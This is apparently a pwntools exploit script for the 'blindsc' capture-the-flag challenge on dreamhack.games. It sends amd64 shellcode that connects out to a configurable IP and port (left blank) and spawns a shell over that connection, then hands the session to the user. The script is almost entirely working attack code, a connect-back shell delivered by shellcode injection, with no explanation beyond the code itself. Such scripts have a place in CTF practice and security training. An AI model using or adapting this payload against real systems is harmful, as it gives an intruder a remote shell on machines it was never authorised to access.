#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
context.binary = elf = ELF('./blindsc', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
b *main+615
c
c
si
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rcu = lambda data: io.recvuntil(data)
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
        #return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path}, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 14913)
    else:
        return process(elf.path)
        #return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

IP = ''
#IP = '127.0.0.1'
PORT = ''

shellcode = shellcraft.amd64.linux.connect(IP, PORT, 'ipv4')
shellcode += shellcraft.amd64.linux.findpeersh(PORT)


io = start()
sla(b'Input shellcode: ', asm(shellcode))
print(b"Here: " + io.recvline())
io.interactive()